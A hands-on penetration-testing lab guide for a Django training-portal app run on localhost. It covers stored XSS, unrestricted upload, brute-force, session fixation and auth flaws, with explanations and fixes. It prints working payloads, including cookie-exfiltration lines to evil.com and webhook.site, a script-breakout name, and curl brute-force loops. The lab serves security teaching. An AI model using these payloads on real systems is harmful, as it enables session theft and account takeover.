# Penetration Testing Lab — LuckyTech Innovation Ground Portal

> **For beginners.** Each finding below shows you exactly what to type and what to expect.
> Run everything locally — you own this app, so you're not breaking anything illegal.

---

## Setup — Get the Vulnerable App Running

```bash
# 1. Open a terminal and go to the project
cd /home/francis/Desktop/Projects/Lig/ligplatform

# 2. Activate the virtual environment
source venv/bin/activate

# 3. Start the dev server (keep this terminal open)
python manage.py runserver
```

**Open a second terminal** for all the attack commands below.

```bash
# In the second terminal
cd /home/francis/Desktop/Projects/Lig/ligplatform
source venv/bin/activate
```

You'll need:
- **curl** (pre-installed on Linux/macOS)
- A **web browser** (Chrome/Firefox)
- **Developer Tools** (F12 in your browser)

---

## Finding 1: Stored XSS via Assignment URL (CRITICAL)

**What's wrong:** When a student submits an assignment, they provide a URL. This URL is displayed as a clickable link to the admin/mentor. The app doesn't check if the URL starts with `http://` — so a student can put `javascript:...` code there. When the admin clicks it, the code runs inside the admin's browser.

### Step-by-Step

**1. Register a test student**

Open `http://localhost:8000/apply/` in your browser. Fill in the form with:
- Full Name: `XSS Tester`
- Email: `xss@test.com`
- Phone: `1234567890`
- Institution: `Test Uni`
- Programme: `BSc Computer Science`
- Level: `200`
- Duration: `12 weeks`
- Courses: check `Software Development`

Submit. Write down the **Student ID** and **password** from the terminal output (check the terminal where `runserver` is running — Django prints the email there).

**2. Log in as the student**

Open `http://localhost:8000/login/` and log in with the Student ID and password you got.

**3. Submit an assignment with a malicious URL**

If you don't have an unlocked week yet, an admin needs to first:
- Open `http://localhost:8000/manage/login/` and log in (username: `lig`, password you set during `createsuperuser`).
- Create a mentor and assign them to Software Development.
- Log in as the mentor at `http://localhost:8000/mentor/login/`.
- Mark Week 1 as complete for the student.

Then as the student, visit `http://localhost:8000/course-outline/` and submit an assignment. In the **Submission URL** field, paste:

```
javascript:alert('XSS works! Your cookies: ' + document.cookie)
```

**4. Log in as the admin and click the link**

In a new **Incognito/Private window**, go to `http://localhost:8000/manage/login/` and log in as admin.

Go to `http://localhost:8000/manage/assignments/` and click the student's submission URL. You'll see an alert popup with the admin's cookies — that means XSS worked.

**5. Real attack payload (try this instead of `alert`)**

Instead of the simple `alert`, a real attacker would use:

```
javascript:fetch('https://evil.com/steal?cookie=' + document.cookie)
```

This silently sends the admin's session cookie to a server the attacker controls.

### What You Learned

You exploited **Stored XSS** — the malicious code was stored in the database and executed when someone else viewed it. This is the most dangerous type of XSS because you don't need to trick the victim into clicking a crafted link; they just click something normal-looking on the site.

### Check Your Understanding

- Why does `javascript:` work in an `<a href>` but not in a normal text field?
- What other HTML attributes could you inject into besides `href`?
- How would you fix this?

---

## Finding 2: Unrestricted File Upload (CRITICAL)

**What's wrong:** The app lets users upload ANY file type. A student can upload an HTML file containing JavaScript, then trick an admin into visiting that file's URL to steal their session.

### Step-by-Step

**1. Create a malicious HTML file**

```bash
# In your second terminal
cat > /tmp/evil.html << 'EOF'
<html>
<body>
<script>
alert("Your session cookie is: " + document.cookie);
// In a real attack:
// fetch('https://evil.com/steal?c=' + document.cookie);
</script>
</body>
</html>
EOF
```

**2. Register a new student with this file as the attachment letter**

Open `http://localhost:8000/apply/` and fill out the form, but for **Attachment Letter**, choose the `/tmp/evil.html` file.

Submit.

**3. Find the file's URL**

Django saves uploaded files to `media/attachment_letters/`. The file URL will be:

```
http://localhost:8000/media/attachment_letters/evil.html
```

Visit that URL in your browser. The script executes!

**4. Why this bypasses CSP**

Even though the app has Content-Security-Policy headers, they only apply to pages served by Django. When you visit a static file directly at `/media/...`, the web server serves it without CSP headers. The script runs freely.

### What You Learned

**Unrestricted file upload** lets attackers:
- Host malicious HTML/JS on your domain (phishing pages, credential stealers)
- Upload executable files (if the server processes them)
- Upload oversized files (denial of service)

### Check Your Understanding

- What would happen if you uploaded a `.php` file instead of `.html`?
- How would you restrict file uploads to only PDF?
- What other files could you upload to cause damage?

---

## Finding 3: Admin Rate Limit Doesn't Block (HIGH)

**What's wrong:** The `@ratelimit` decorator on `admin_login` is missing `block=True`. This means the server counts failed attempts but NEVER blocks them. An attacker can guess passwords as fast as their computer can send requests.

### Step-by-Step

**1. Verify the rate limit is missing**

Look at the code:

```bash
grep -A2 '@ratelimit' core/views.py | head -20
```

Notice `login_view` line says `@ratelimit(..., block=True)` but `admin_login` line does NOT.

**2. Test the difference — student login (blocks you)**

Run this in your **second terminal**:

```bash
# Send 6 rapid login attempts to the student login
for i in $(seq 1 6); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/login/ \
    -d "student_id=FAKE&password=wrong$i")
  echo "Attempt $i: HTTP $code"
done
```

You should see the 6th attempt return a different status code (429 or 403) — it's blocked.

**3. Now test the admin login (never blocks)**

```bash
# Send 10 rapid login attempts to the admin login
for i in $(seq 1 10); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/manage/login/ \
    -d "username=lig&password=wrong$i")
  echo "Attempt $i: HTTP $code"
done
```

Every request returns 200 — no blocking! You can send a million attempts.

**4. Brute-force the admin password**

First, check what the admin password is:

```bash
# Look at the Django admin user
python manage.py shell -c "
from django.contrib.auth.models import User
u = User.objects.get(username='lig')
print(f'Admin user: lig')
print(f'Password hash: {u.password[:30]}...')
print('(hashed — you need to brute-force it)')
"
```

Now try a brute force (use a small wordlist for testing):

```bash
# Create a small test wordlist
cat > /tmp/wordlist.txt << 'EOF'
123456
password
admin
letmein
django
admin123
lig
lig2024
ligplatform
EOF

# Brute-force the admin login
while read -r pass; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/manage/login/ \
    -d "username=lig&password=$pass" \
    -D - 2>/dev/null | head -1)
  echo "Trying '$pass' ... $response"
done < /tmp/wordlist.txt
```

If the password is in your wordlist, you'll get a 302 redirect (login success) instead of 200 (login failed).

### What You Learned

**Rate limiting without `block=True` is useless.** It logs the events but doesn't prevent the attack. Always use `block=True` on authentication endpoints.

### Check Your Understanding

- Why is admin brute force more dangerous than student brute force?
- What other ways could you bypass rate limiting? (hint: IP rotation, proxy chains)
- Why do you think the developer forgot `block=True` on this endpoint?

---

## Finding 4: `payment_callback` Auto-Login (HIGH)

**What's wrong:** When a payment succeeds, Paystack redirects the user to `/payments/callback/?reference=...`. The app looks up the payment by reference and **automatically logs in** as that student — no password required.

### Step-by-Step

**1. Create a student and make a payment record**

```bash
python manage.py shell << 'EOF'
from core.models import Student, Cohort, Payment
import uuid

# Create a student
student, _ = Student.objects.get_or_create(
    email="target@test.com",
    defaults={
        "full_name": "Target Student",
        "phone": "1234567890",
        "institution": "Test Uni",
        "programme": "CS",
        "level": "200",
        "duration": "12 weeks",
        "cohort": Cohort.get_default(),
    }
)

# Create a payment record with a known reference
reference = f"LIG-{student.student_id}-{uuid.uuid4().hex[:10]}".upper()
Payment.objects.create(
    student=student,
    reference=reference,
    amount=150.00,
    status='pending',
)
print(f"Student ID: {student.student_id}")
print(f"Reference:  {reference}")
EOF
```

**2. Exploit the auto-login**

Copy the `Reference` value printed above, then visit this URL in your browser:

```
http://localhost:8000/payments/callback/?reference=PASTE_REFERENCE_HERE
```

You're now logged in as the student — **no password needed!** Check by visiting `http://localhost:8000/dashboard/`.

**3. The real-world scenario**

- An attacker on the same WiFi network can sniff HTTP traffic during a payment.
- They see the redirect URL containing the reference.
- They paste it in their own browser before the legitimate user does.
- They're now logged in as the victim.

### What You Learned

**Never trust callback URLs to authenticate users.** Payment callbacks should show a "Payment confirmed" page, not log the user in. If you need auto-login, use a one-time token that was generated and stored when the user initiated the payment.

### Check Your Understanding

- Could an attacker guess a valid reference randomly? (Look at how references are generated)
- What would happen if you visited the callback URL twice?
- How would you fix this while keeping the auto-login feature?

---

## Finding 5: Student Name in JavaScript Context (HIGH)

**What's wrong:** The admin page that confirms suspending/deleting a student puts the student's name directly inside a JavaScript string. The `{{ student.full_name|escapejs }}` filter is NOT used. A student with a malicious name can break out of the JavaScript string and execute code.

### Step-by-Step

**1. Create a student with a malicious name**

```bash
python manage.py shell << 'EOF'
from core.models import Student, Cohort

Student.objects.create(
    full_name="</script><script>alert('XSS via name! Cookie: ' + document.cookie)</script>",
    email="evilname@test.com",
    phone="1234567890",
    institution="Test",
    programme="CS",
    level="200",
    duration="12 weeks",
    cohort=Cohort.get_default(),
)
print("Malicious student created!")
EOF
```

**2. Visit the admin student detail page**

Log in as admin at `http://localhost:8000/manage/login/`.

Go to `http://localhost:8000/manage/students/` — you'll see the list. Click the student with the weird name.

**3. Click "Suspend" or "Delete"**

When you click the "Suspend" or "Delete" button, the confirmation modal pops up. But more importantly, look at what happens to the page — the injected `<script>` tag closed the original `<script>` block and ran the `alert()`.

**4. Examine the source**

In your browser, right-click → **View Page Source** (or `Ctrl+U`). Search for `evilname` and see how the name broke out of the JavaScript context:

```html
<!-- What the developer intended: -->
<script>
message.textContent = 'Are you sure you want to delete ...';
</script>

<!-- What actually renders: -->
<script>
message.textContent = 'Are you sure you want to delete 
</script><script>alert('XSS!')</script> ...';
</script>
```

The `</script>` in the name closes the first `<script>` tag. Then our new `<script>` begins a fresh JavaScript block that runs immediately.

### What You Learned

**Context matters for escaping.** HTML escaping (`&lt;` etc.) is useless inside a JavaScript string. You must use JavaScript-specific escaping (`escapejs` filter in Django). This is one of THE most common XSS mistakes — developers escape for HTML but the variable ends up in a JS context.

### Check Your Understanding

- Why does `textContent` not prevent this attack? (hint: the string is already rendered into HTML before it reaches `textContent`)
- What other template variables might be vulnerable? (search for `{{ variable }}` inside `<script>` tags)
- Why is `escapejs` the right fix instead of `escape`?

---

## Finding 6: Session Fixation (HIGH)

**What's wrong:** When a user logs in, the server keeps the same session ID. An attacker can force a victim to use a session ID the attacker knows, then after the victim logs in, the attacker uses that same session ID to access the account.

### Step-by-Step

**1. Get a session ID as an attacker**

Open an **incognito/private window** and visit `http://localhost:8000/login/`.

Open Developer Tools (F12) → **Application** tab → **Cookies** → `localhost:8000`. Copy the `sessionid` value. Let's say it's `abc123`.

**2. Trick the victim (in theory)**

In a real attack, you'd craft a link like:

```
http://localhost:8000/login/?sessionid=abc123
```

But actually, session IDs are set via cookies, not URL parameters. A real attacker would need another XSS vulnerability (like Finding 1 or 5) to set the cookie, OR they'd use a link from another subdomain you control that sets a cookie for `lig.com.gh`.

**3. Demonstrate the core issue**

Let's prove the session ID doesn't change after login:

```bash
# First, get a session from the login page
SESSION_ID=$(curl -s -c - http://localhost:8000/login/ | grep sessionid | awk '{print $NF}')
echo "Session ID before login: $SESSION_ID"

# Now log in as a student (use a real student_id/password from your test data)
STUDENT_ID="LIG-2026-XXXX"   # ← Replace with a real student ID
PASSWORD="xxxx"               # ← Replace with the real password

curl -s -o /dev/null -X POST http://localhost:8000/login/ \
  -b "sessionid=$SESSION_ID" \
  -d "student_id=$STUDENT_ID&password=$PASSWORD"

# Check if the session ID changed
curl -s -c - http://localhost:8000/dashboard/ \
  -b "sessionid=$SESSION_ID" | grep sessionid
```

The session ID stays the same! If an attacker knew this session ID before login, they can use it after login too.

**4. Python script to confirm**

```bash
python3 << 'PYEOF'
import requests

# Step 1: Get a session from the login page
s = requests.Session()
s.get("http://localhost:8000/login/")
session_id_before = s.cookies.get("sessionid")
print(f"Session ID before login: {session_id_before}")

# Step 2: Log in (use your test student's credentials)
student_id = input("Enter student ID: ")
password = input("Enter password: ")

r = s.post("http://localhost:8000/login/", data={
    "student_id": student_id,
    "password": password,
}, allow_redirects=False)

session_id_after = s.cookies.get("sessionid")
print(f"Session ID after login:  {session_id_after}")
print(f"Same session ID? {session_id_before == session_id_after}")
print(f"Login successful? {r.status_code == 302}")

# Step 3: Now use this session to access the dashboard
r2 = s.get("http://localhost:8000/dashboard/")
print(f"Accessed dashboard? {r2.status_code == 200}")
print(f"Student name in page: {'Welcome' in r2.text}")
PYEOF
```

If you see "Same session ID? True", you've confirmed the session fixation vulnerability.

### What You Learned

**Session fixation** is when the server doesn't change the session ID after a privilege level change (like login). The fix is always `request.session.cycle_key()` after successful login.

### Check Your Understanding

- How is session fixation different from session hijacking?
- Could you exploit this without another vulnerability? (How would you set the victim's cookie?)
- Why does `cycle_key()` fix this?

---

## Finding 7: Suspended Mentors Can Still Log In (HIGH)

**What's wrong:** The mentor login never checks if the mentor is `is_active`. The admin can "suspend" a mentor, but the mentor can still log in.

### Step-by-Step

**1. Create a mentor**

Log in as admin at `http://localhost:8000/manage/login/`.

Go to **Mentors** → fill in the form and create a mentor. Note the Mentor ID that appears in the success message.

**2. Log in as the mentor**

Open an incognito window and go to `http://localhost:8000/mentor/login/`. Log in with the Mentor ID and password from the terminal email output.

**3. Suspend the mentor (as admin)**

Back in the admin browser, go to **Students** → find a student → click **Suspend**. Wait, that's for students. To suspend a mentor, you'll need to do it via the shell:

```bash
python manage.py shell << 'EOF'
from core.models import Mentor
# Get the first mentor (replace with actual mentor_id if multiple)
mentor = Mentor.objects.first()
print(f"Mentor: {mentor.full_name} ({mentor.mentor_id})")
print(f"Is active: {mentor.is_active}")

# Suspend them
mentor.is_active = False
mentor.save()
print("Mentor suspended!")
EOF
```

**4. Verify the mentor can still log in**

In the incognito browser where you logged in as the mentor, refresh the page (`http://localhost:8000/mentor/`). You're **still logged in!**

Even after logging out and trying to log in again, it will succeed because the code never checks `is_active`:

```python
# Current code (vulnerable):
if mentor and mentor.check_password(password):
    request.session['mentor_pk'] = mentor.pk

# Compare with student login (secure):
if student and student.check_password(password):
    if not student.is_active:        # ← This check is missing for mentors!
        return redirect(...)
```

### What You Learned

**Inconsistent authorization checks** create security holes. When you add a feature (like mentor suspension), you must check it EVERYWHERE access is granted, not just in the admin panel.

### Check Your Understanding

- What other checks might be inconsistent between students and mentors?
- Why might the developer have forgotten this check?
- What else should be checked when logging in? (failed attempts, account age, IP restrictions?)

---

## Finding 8: Mentor Logout Doesn't Clear Session (MEDIUM)

**What's wrong:** The mentor logout removes `mentor_pk` from the session but keeps the session ID and all other data. If a student was also logged in on this browser, their session persists.

### Step-by-Step

**1. Log in as a student**

Open a browser, log in at `http://localhost:8000/login/`, then visit the dashboard at `http://localhost:8000/dashboard/`.

**2. Without logging out as student, log in as a mentor**

Open a new tab and go to `http://localhost:8000/mentor/login/`. Log in as a mentor.

**3. Log out as mentor**

Click the **Log Out** button in the mentor portal.

**4. Check if the student session is still valid**

In your browser's Developer Tools → **Application** → **Cookies** → note the `sessionid` value.

Now visit `http://localhost:8000/dashboard/`. If you still see the student dashboard, the student session persisted through the mentor logout.

```bash
# Or via command line:
curl -s -o /dev/null -w "%{http_code}" \
  -b "sessionid=YOUR_SESSION_ID" \
  http://localhost:8000/dashboard/
# If 200, you're still logged in as the student
```

### What You Learned

**`session.pop()` removes one key but keeps the session alive.** `session.flush()` creates a completely new session, destroying all old data. Always use `flush()` for logout.

### Check Your Understanding

- Could you chain this with Finding 6 for a more dangerous attack?
- What other session data might leak through this bug?
- Why does the student logout use `flush()` but mentor logout uses `pop()`?

---

## Finding 9: No Rate Limit on Password Change (MEDIUM)

**What's wrong:** Both `student_settings` and `mentor_change_password` have no `@ratelimit` decorator. An attacker with a stolen session cookie can brute-force the current password unlimited times.

### Step-by-Step

**1. Get a student's session cookie**

Open the student dashboard, open Developer Tools, and copy the `sessionid` cookie.

**2. Brute-force the current password**

```bash
SESSION_ID="paste_session_id_here"
STUDENT_ID="LIG-2026-XXXX"  # Replace

# Try wrong passwords — no rate limit!
for guess in "wrong" "wrong2" "wrong3" "wrong4" "letmein" "password123"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/settings/ \
    -b "sessionid=$SESSION_ID" \
    -d "current_password=$guess&new_password=test123&confirm_password=test123")
  
  if [ "$response" = "302" ]; then
    echo "FOUND! Current password is: $guess"
    break
  else
    echo "Tried '$guess' → $response"
  fi
done
```

Notice you can try hundreds of passwords per second with no blocking.

### What You Learned

**Rate limiting must be on ALL sensitive actions**, not just login. Password change, password reset, email change, and 2FA endpoints all need protection.

### Check Your Understanding

- Why is this finding rated "MEDIUM" instead of "HIGH"? (hint: what must the attacker already have?)
- How would you implement rate limiting here? (key by user ID, not IP)
- What if the attacker rotates their IP?

---

## Finding 10: CSP `'unsafe-inline'` Allows All Scripts (MEDIUM)

**What's wrong:** The Content-Security-Policy has `'unsafe-inline'` for scripts. This means any injected script executes freely — the CSP provides NO protection against XSS.

### Step-by-Step

**1. Check the CSP header**

```bash
curl -s -I http://localhost:8000/ | grep -i content-security-policy
```

You should see something like:
```
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; ...
```

The `'unsafe-inline'` part is the problem — it says "allow any inline `<script>` tag".

**2. Demonstate why this matters**

Go back to **Finding 1** (XSS via submission_url) or **Finding 5** (XSS via student name). Those attacks worked. Now, imagine what would happen if `'unsafe-inline'` was removed:

- Finding 1's `javascript:` URL would still execute JS, but it would be blocked by CSP.
- Finding 5's `</script><script>alert(1)</script>` would be blocked.

**3. Compare with a secure CSP**

A secure CSP would look like:
```
script-src 'self' https://cdnjs.cloudflare.com 'nonce-r4nd0m'
```

This means:
- Scripts from the same origin (`'self'`) are allowed
- Scripts from `cdnjs.cloudflare.com` are allowed
- Inline scripts with the correct `nonce="r4nd0m"` attribute are allowed
- **All other inline scripts are blocked** — including XSS payloads

### What You Learned

**CSP is your last line of defense.** If your CSP has `'unsafe-inline'`, it's like having a firewall with the front door wide open. The whole point of CSP is to block inline scripts — `'unsafe-inline'` completely defeats that purpose.

### Check Your Understanding

- Why did the developer add `'unsafe-inline'`? (check the templates — many use inline `<script>` and `<style>` tags)
- How would you fix this properly? (hint: move scripts to external files, or use nonces)
- What does `'unsafe-eval'` do, and why is it also dangerous?

---

## Putting It All Together — Attack Chains

Now try combining vulnerabilities for maximum impact:

### Chain: Student → Admin Takeover

```
1. (Finding 1) Register as a student
2. Submit assignment with: javascript:fetch('https://webhook.site/YOUR-KEY?c='+document.cookie)
3. Wait for admin to click the link (or trick them via email/social engineering)
4. Receive admin's session cookie on your webhook
5. (Cookie now) Log in as admin — full control
```

### Chain: External Attacker → Full Compromise

```
1. (Finding 3) Brute-force the admin password (unlimited attempts)
2. (Admin access) Create a student account with XSS name (Finding 5)
3. Or create a mentor account
4. (Finding 7) If mentor is suspended, still access mentor portal
```

### Chain: Network Attacker → Student Hijack

```
1. (Finding 4) Sniff WiFi traffic during a payment
2. Extract the callback URL with the payment reference
3. Visit the URL before the real student — instant login
4. (Finding 9) With the session cookie, brute-force their password
5. Now you have the password permanently
```

---

## Your Turn — Practice Exercises

Try these without reading the answers:

1. **Find another XSS** — Search all templates for `{{ variable }}` inside `<script>` tags. There's one more besides Finding 5. (`hint: check payments.html`)

2. **IDOR hunt** — The `admin_student_detail` view checks `@require_admin`. But does any admin view expose data it shouldn't? How about the `download_receipt`? (`hint: it checks student=student`)

3. **Rate limit audit** — Go through every view in `core/views.py` that accepts POST. Which ones are missing `@ratelimit` entirely?

4. **CSRF test** — Some forms use `{% csrf_token %}`. Are there any POST endpoints that DON'T include the CSRF token in their template?

5. **Information disclosure** — When a password reset link is invalid, does the error message reveal too much?

---

## How to Fix Everything

When you're done breaking things, here's how to fix them all:

```bash
# 1. Fix the code (in order of severity)
# Edit core/views.py and:
#   - Add URL validation on submission_url (line 432)
#   - Add block=True to admin_login (line 853)
#   - Add session.cycle_key() after login (line 146)
#   - Add mentor.is_active check (line 514)
#   - Replace session.pop with flush (line 527)
#   - Add rate limiting to settings/change_password (lines 694, 722)
#
# 2. Edit core/models.py:
#   - Add FileExtensionValidator to FileFields
#
# 3. Edit templates:
#   - Use |escapejs for names in JS context
#   - Move inline scripts to .js files
#
# 4. Edit ligplatform/settings.py:
#   - Remove 'unsafe-inline' from CSP_SCRIPT_SRC
#   - Remove 'unsafe-inline' from CSP_STYLE_SRC
#   - Add nonce/hash for required inline scripts
```

---

*This lab is for educational purposes. You're testing an app you own against yourself. Never do this to someone else's site without written permission.*
